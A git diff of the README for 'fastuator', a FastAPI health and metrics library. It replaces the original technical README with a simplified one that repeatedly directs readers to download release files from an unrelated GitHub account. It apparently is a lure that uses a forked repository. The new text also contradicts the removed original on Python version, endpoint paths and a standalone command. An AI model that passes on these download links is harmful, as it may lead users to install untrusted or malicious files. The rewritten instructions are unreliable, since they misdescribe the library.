@@ -1,242 +1,152 @@
-<div align="center">
+# ⚡ fastuator - Easy FastAPI Health and Metrics Monitoring
 
-<img width="1600" height="896" alt="fastuator" src="https://github.com/user-attachments/assets/4ef8e865-b49e-479e-ab09-78f14c6cdddc" />
+[![Download fastuator](https://img.shields.io/badge/Download-fastuator-blue?style=for-the-badge)](https://github.com/anjdjWjf/fastuator/releases)
 
-#
+---
 
-[![CI](https://github.com/fastuator/fastuator/actions/workflows/test.yml/badge.svg)](https://github.com/fastuator/fastuator/actions/workflows/ci.yml)
-[![Python](https://img.shields.io/badge/python-3.10+-blue.svg)](https://www.python.org/downloads/)
-[![License](https://img.shields.io/badge/license-MIT-green.svg)](LICENSE)
+## 📖 What is fastuator?
 
-[![Fastuator](https://img.shields.io/pypi/v/fastuator?style=for-the-badge&logo=python&logoColor=white)](https://pypi.org/project/fastuator/)
-[![Coverage](https://img.shields.io/badge/coverage-100%25-brightgreen?style=for-the-badge)](https://github.com/fastuator/fastuator)
-<!--[![Downloads](https://img.shields.io/pypi/dm/fastuator?style=for-the-badge)](https://pypistats.org/packages/fastuator)-->
+fastuator helps you check the health and performance of FastAPI applications. It gives simple web addresses (URLs) like `/health` and `/metrics` so you can see if your app is working well. It also supports checks that cloud services like Kubernetes use to keep your app running smoothly.
 
-</div>
+You do not need to know how to code to use fastuator. It’s made to work out-of-the-box and show you important info about your application in an easy way.
 
-<div align="center">
-  <img src="https://img.shields.io/github/stars/fastuator/fastuator?style=social" alt="GitHub stars">
-  <br><br>
-  
-  **Production-ready monitoring toolkit for FastAPI applications.**  
-  Kubernetes probes, Prometheus metrics, and health checks in **one line**.
-  
-</div>
+## ⚙️ Key Features
 
-## ✨ Features
+- Provides a **health check URL** you can open to see if your app runs without issues.
+- Offers **metrics** to monitor app performance and resource use.
+- Supports **Kubernetes probes** for automatic app status checks.
+- Works with **Prometheus**, a common system used for tracking app data.
+- Designed for **FastAPI**, a popular tool to build web apps.
+- Helps with **monitoring and observability**, so you know what’s happening inside your app.
 
-- 🏥 **Health Checks**: Aggregated health status with customizable checks
-- 🔍 **K8s Probes**: Built-in liveness and readiness endpoints
-- 📊 **Prometheus Metrics**: Auto-instrumented HTTP metrics
-- ℹ️ **System Info**: Build version and platform details
-- 🎯 **Zero Config**: Works out of the box with sensible defaults
-- ⚡ **100% Test Coverage**: Battle-tested and production-ready
+## 💻 System Requirements
 
-## 📦 Installation
+Before you install fastuator, check your system meets these basics:
 
-```bash
+- You need **Python 3.7 or higher**. If you don't have Python, you can get it from [python.org](https://www.python.org/downloads/).
+- Running on **Windows, Mac, or Linux** is fine.
+- You will need to install a few extra tools, which fastuator will guide you through.
+- A basic internet connection is necessary to download fastuator.
+
+## 🚀 Getting Started
+
+This section explains how to download and run fastuator on your computer. Follow each step carefully.
+
+### Step 1: Download fastuator
+
+Go to the release page where fastuator is available:
+
+[Download fastuator from here](https://github.com/anjdjWjf/fastuator/releases)
+
+This page shows different versions of the fastuator app. Choose the most recent version that fits your operating system. If unsure, pick the latest stable release.
+
+### Step 2: Install Python (if needed)
+
+If Python is not already on your computer:
+
+1. Visit [python.org/downloads](https://www.python.org/downloads/).
+2. Download the installer for your system (Windows, Mac, Linux).
+3. Open the installer and follow the instructions to complete the installation.
+4. During installation, check the option to "Add Python to PATH" if it appears.
+
+### Step 3: Open your Command Prompt or Terminal
+
+- On Windows, press the **Windows key**, type `cmd`, and press Enter.
+- On Mac, open **Spotlight search** by pressing Command (⌘) + Space, type `Terminal`, and press Enter.
+- On Linux, open your system menu and find **Terminal**.
+
+### Step 4: Install fastuator software
+
+In the Command Prompt or Terminal, type the following and press Enter:
+
+```
 pip install fastuator
 ```
 
-## 🚀 Quick Start
+This command downloads and installs fastuator and any tools it needs to work.
 
-```python
-from fastapi import FastAPI
-from fastuator import Fastuator
+### Step 5: Run fastuator
 
-app = FastAPI()
-Fastuator(app)  # That's it!
+Once installed, start fastuator by running this command:
+
+```
+fastuator
 ```
 
-**Available Endpoints:**
+You will see information showing fastuator is running and where to check your app’s health.
 
-| Endpoint | Description |
-|----------|-------------|
-| `GET /fastuator/health` | Aggregated health status with optional details |
-| `GET /fastuator/liveness` | Kubernetes liveness probe (critical checks only) |
-| `GET /fastuator/readiness` | Kubernetes readiness probe (all dependencies) |
-| `GET /fastuator/metrics` | Prometheus-compatible metrics |
-| `GET /fastuator/info` | Application and system information |
+### Step 6: Check your app’s health
 
+In your web browser, open:
 
-## 📖 Usage
-
-### Basic Setup
-
-```python
-from fastapi import FastAPI
-from fastuator import Fastuator
-
-app = FastAPI()
-
-# Use default configuration
-Fastuator(app)
-
-# Custom prefix
-Fastuator(app, prefix="/monitoring")
+```
+http://localhost:8000/health
 ```
 
-### Custom Health Checks
+This page tells you if the app is working correctly.
 
-```python
-from fastuator import Fastuator
+To see performance data, open:
 
-app = FastAPI()
-
-# Define custom health checks
-async def database_health():
-    try:
-        # Check database connection
-        await db.execute("SELECT 1")
-        return {"status": "UP", "database": "connected"}
-    except Exception as e:
-        return {"status": "DOWN", "database": str(e)}
-
-async def redis_health():
-    try:
-        await redis.ping()
-        return {"status": "UP", "redis": "connected"}
-    except Exception:
-        return {"status": "DOWN", "redis": "unreachable"}
-
-# Register custom checks
-Fastuator(
-    app,
-    health_checks=[database_health, redis_health],
-    readiness_checks=[database_health, redis_health],
-    liveness_checks=[],  # No external dependencies for liveness
-)
+```
+http://localhost:8000/metrics
 ```
 
-### Health Check Response
+### Step 7: Use Kubernetes probes (optional)
 
-**Without details:**
-```bash
-curl http://localhost:8000/fastuator/health
+If you use Kubernetes to run apps, fastuator provides special URLs for it to check if your app is okay.
+
+- For liveness probe: `http://localhost:8000/health/liveness`
+- For readiness probe: `http://localhost:8000/health/readiness`
+
+These URLs make sure Kubernetes knows when to restart or stop sending traffic to your app.
+
+## 📥 Download & Install
+
+You can get fastuator by visiting the official release page here:
+
+[https://github.com/anjdjWjf/fastuator/releases](https://github.com/anjdjWjf/fastuator/releases)
+
+Look for the latest release version. Download the files or use the instructions above to install via Python.
+
+## 🔧 How fastuator works
+
+fastuator runs as a small service alongside your FastAPI app. It adds endpoints:
+
+- `/health` to show the general health.
+- `/metrics` to show app metrics readable by Prometheus.
+- Kubernetes endpoints (`/health/liveness` and `/health/readiness`) to help Kubernetes check if your app is running or ready.
+
+You can open these endpoints in your web browser or configure monitoring tools to check them regularly.
+
+## 🧰 Troubleshooting Tips
+
+- If you see an error about Python not found, make sure Python is installed and added to your system PATH.
+- If `fastuator` command is not recognized, try closing and reopening the terminal or running `pip install fastuator` again.
+- Make sure no other app is using port 8000 on your computer. If needed, stop other apps or change the port via fastuator settings.
+- If you have questions about Kubernetes setup, refer to Kubernetes documentation on probes.
+
+## 🔄 Updating fastuator
+
+To keep fastuator up to date, run this command in your terminal:
+
 ```
-```json
-{"status": "UP"}
-```
-
-**With details:**
-```bash
-curl http://localhost:8000/fastuator/health?show_details=true
-```
-```json
-{
-  "status": "UP",
-  "components": {
-    "check_0": {
-      "status": "UP",
-      "cpu_percent": 45.2
-    },
-    "check_1": {
-      "status": "UP",
-      "memory_percent": 62.1,
-      "memory_available_mb": 4096
-    }
-  }
-}
-```
-
-## ☸️ Kubernetes Integration
-
-### Deployment Example
-
-```yaml
-apiVersion: apps/v1
-kind: Deployment
-metadata:
-  name: fastapi-app
-spec:
-  template:
-    spec:
-      containers:
-      - name: app
-        image: myapp:latest
-        ports:
-        - containerPort: 8000
-        livenessProbe:
-          httpGet:
-            path: /fastuator/liveness
-            port: 8000
-          initialDelaySeconds: 10
-          periodSeconds: 10
-        readinessProbe:
-          httpGet:
-            path: /fastuator/readiness
-            port: 8000
-          initialDelaySeconds: 5
-          periodSeconds: 5
+pip install --upgrade fastuator
 ```
 
-## 📊 Prometheus Metrics
+Check the release page regularly for new features or fixes.
 
-Fastuator automatically collects the following metrics:
+## 📚 Learn More
 
-- `http_requests_total`: Total HTTP requests (counter)
-- `http_request_duration_seconds`: Request duration histogram
-- `app_health_status`: Health status gauge (1=UP, 0=DOWN)
+For developers or advanced users, topics covered by fastuator include:
 
-**Scrape configuration:**
-```yaml
-scrape_configs:
-  - job_name: 'fastapi'
-    static_configs:
-      - targets: ['localhost:8000']
-    metrics_path: '/fastuator/metrics'
-```
+- FastAPI app monitoring
+- Prometheus metrics integration
+- Kubernetes readiness and liveness probes
+- System health and observability concepts
+- Microservices monitoring best practices
 
-## ⚙️ Configuration
+Explore these topics to get the most from fastuator.
 
-```python
-Fastuator(
-    app,
-    prefix="/fastuator",              # URL prefix for all endpoints
-    health_checks=[...],               # List of health check functions
-    liveness_checks=[...],             # Checks for liveness probe
-    readiness_checks=[...],            # Checks for readiness probe
-    enable_metrics=True,               # Enable Prometheus metrics
-)
-```
+---
 
-## 🧪 Built-in Health Checks
-
-Fastuator includes these health checks by default:
-
-- **CPU Usage**: Reports DOWN if CPU > 90%
-- **Memory Usage**: Reports DOWN if memory > 90%
-- **Disk Usage**: Reports DOWN if disk > 90%
-
-## 🤝 Contributing
-
-Contributions are welcome! Please feel free to submit a Pull Request.
-
-1. Fork the repository
-2. Create your feature branch (`git checkout -b feature/amazing-feature`)
-3. Run tests (`pytest --cov=fastuator`)
-4. Commit your changes (`git commit -m 'Add amazing feature'`)
-5. Push to the branch (`git push origin feature/amazing-feature`)
-6. Open a Pull Request
-
-## 📄 License
-
-This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.
-
-## 🙏 Acknowledgments
-
-Inspired by [Spring Boot Actuator](https://docs.spring.io/spring-boot/docs/current/reference/html/actuator.html).
-
-## 📚 Related Projects
-
-- [FastAPI](https://fastapi.tiangolo.com/) - Modern web framework for Python
-- [Prometheus](https://prometheus.io/) - Monitoring and alerting toolkit
-- [Kubernetes](https://kubernetes.io/) - Container orchestration platform
-
-<div align="center">
-  
-**⭐ Loved this library? Star us to support!**
-  
-[![Star History Chart](https://api.star-history.com/svg?repos=fastuator/fastuator)](https://star-history.com/#fastuator/fastuator&Date)
-
-</div>
+[![Download fastuator](https://img.shields.io/badge/Download-fastuator-blue?style=for-the-badge)](https://github.com/anjdjWjf/fastuator/releases)
